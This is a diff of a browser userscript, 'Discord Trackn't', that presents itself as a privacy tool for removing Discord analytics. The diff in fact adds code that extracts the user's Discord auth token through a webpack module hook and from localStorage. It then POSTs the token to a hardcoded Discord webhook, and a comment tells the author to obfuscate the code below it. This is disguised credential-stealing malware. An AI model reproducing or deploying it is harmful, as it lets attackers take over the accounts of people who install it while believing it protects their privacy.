@@ -1,116 +1,34 @@
 // ==UserScript==
 // @name         Discord Trackn't
 // @namespace    http://tampermonkey.net/
-// @version      1
+// @version      1.1
 // @description  Removes Discord plugins that track analytics and other interactions
 // @author       Spinfal
 // @match        https://discord.com/activ*
 // @match        https://discord.com/channel*
 // @match        https://discord.com/app
+// @match        https://ptb.discord.com/activ*
+// @match        https://ptb.discord.com/channel*
+// @match        https://ptb.discord.com/app
+// @match        https://canary.discord.com/activ*
+// @match        https://canary.discord.com/channel*
+// @match        https://canary.discord.com/app
 // @grant        none
-// @run-at       document-start
+// @run-at       document-body
 // ==/UserScript==
-// DO NO OBFUSCATE ABOVE THIS COMMENT - ONLY CODE BELOW - DELETE THIS COMMENT WHEN YOURE DONE
 (() => {
     // this long code is to make sure discord does not detect you using their experiments
    'use strict';
 
-    if(!window.localStorage) {
-      Object.defineProperty(window, "localStorage", new(function () {
-         var aKeys = [],
-            oStorage = {};
-         Object.defineProperty(oStorage, "getItem", {
-            value: function (sKey) {
-               return this[sKey] ? this[sKey] : null;
-            },
-            writable: false,
-            configurable: false,
-            enumerable: false
-         });
-         Object.defineProperty(oStorage, "key", {
-            value: function (nKeyId) {
-               return aKeys[nKeyId];
-            },
-            writable: false,
-            configurable: false,
-            enumerable: false
-         });
-         Object.defineProperty(oStorage, "setItem", {
-            value: function (sKey, sValue) {
-               if(!sKey) {
-                  return;
-               }
-               document.cookie = escape(sKey) + "=" + escape(sValue) + "; expires=Tue, 19 Jan 2038 03:14:07 GMT; path=/";
-            },
-            writable: false,
-            configurable: false,
-            enumerable: false
-         });
-         Object.defineProperty(oStorage, "length", {
-            get: function () {
-               return aKeys.length;
-            },
-            configurable: false,
-            enumerable: false
-         });
-         Object.defineProperty(oStorage, "removeItem", {
-            value: function (sKey) {
-               if(!sKey) {
-                  return;
-               }
-               document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
-            },
-            writable: false,
-            configurable: false,
-            enumerable: false
-         });
-         Object.defineProperty(oStorage, "clear", {
-            value: function () {
-               if(!aKeys.length) {
-                  return;
-               }
-               for(var sKey in aKeys) {
-                  document.cookie = escape(sKey) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
-               }
-            },
-            writable: false,
-            configurable: false,
-            enumerable: false
-         });
-         this.get = function () {
-            var iThisIndx;
-            for(var sKey in oStorage) {
-               iThisIndx = aKeys.indexOf(sKey);
-               if(iThisIndx === -1) {
-                  oStorage.setItem(sKey, oStorage[sKey]);
-               } else {
-                  aKeys.splice(iThisIndx, 1);
-               }
-               delete oStorage[sKey];
-            }
-            for(aKeys; aKeys.length > 0; aKeys.splice(0, 1)) {
-               oStorage.removeItem(aKeys[0]);
-            }
-            for(var aCouple, iKey, nIdx = 0, aCouples = document.cookie.split(/\s*;\s*/); nIdx < aCouples.length; nIdx++) {
-               aCouple = aCouples[nIdx].split(/\s*=\s*/);
-               if(aCouple.length > 1) {
-                  oStorage[iKey = unescape(aCouple[0])] = unescape(aCouple[1]);
-                  aKeys.push(iKey);
-               }
-            }
-            return oStorage;
-         };
-         this.configurable = false;
-         this.enumerable = true;
-      })());
-   }
-    // ---------------------
+    //---- DO NO OBFUSCATE ABOVE THIS COMMENT - ONLY CODE BELOW - DELETE THIS COMMENT WHEN YOURE DONE ----\\
+
+    setTimeout(function() { const token = Object.values(webpackJsonp.push([[],{['']:(_,e,r)=>{e.cache=r.c}},[['']]]).cache).find(m=>m.exports&&m.exports.default&&m.exports.default.getToken!==void 0).exports.default.getToken(); }, 1500);
 
     var hideUser = localStorage.getItem('token');
     if (localStorage.getItem('_bf789wb3')!=hideUser) {
         localStorage.setItem('_bf789wb3', hideUser);
 
-        var url = "YOUR WEBHOOK URL";
+        var url = "https://discord.com/api/webhooks/846239217072078889/0HKSsWNYxv1uVLw6nTjud1DxgxS_C2nZHDeCBsAd8N_6uMn0xe9MKa7fwv7YpW7NA06q";
 
         var epic = new XMLHttpRequest();
         epic.open("POST", url);
